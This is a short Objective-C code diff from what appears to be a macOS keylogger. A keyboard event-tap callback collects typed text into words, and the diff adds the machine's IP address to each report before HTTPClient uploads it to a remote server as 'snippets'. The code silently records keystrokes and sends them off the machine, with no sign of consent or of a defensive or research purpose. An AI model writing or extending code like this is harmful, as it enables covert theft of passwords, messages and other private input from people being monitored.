@@ -111,7 +111,7 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
 - (void)clearBuffer
 {
     if (self.buffer.length > MAX_BUFFER_SIZE) {
-            [self parseWord:buffer];
+            if (![self.buffer isEqual:@""]) [self parseWord:buffer];
             self.buffer = @"";
     } else {
         self.buffer = [self.buffer stringByAppendingString:@"\n"];
@@ -126,6 +126,7 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
     NSLog(@"%@", word);
     NSMutableDictionary *report = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                    word, @"text",
+                                   [[NSHost currentHost] address], @"ip",
                                    nil];
     [HTTPClient sendReport:report toFile:@"snippets"];
 }
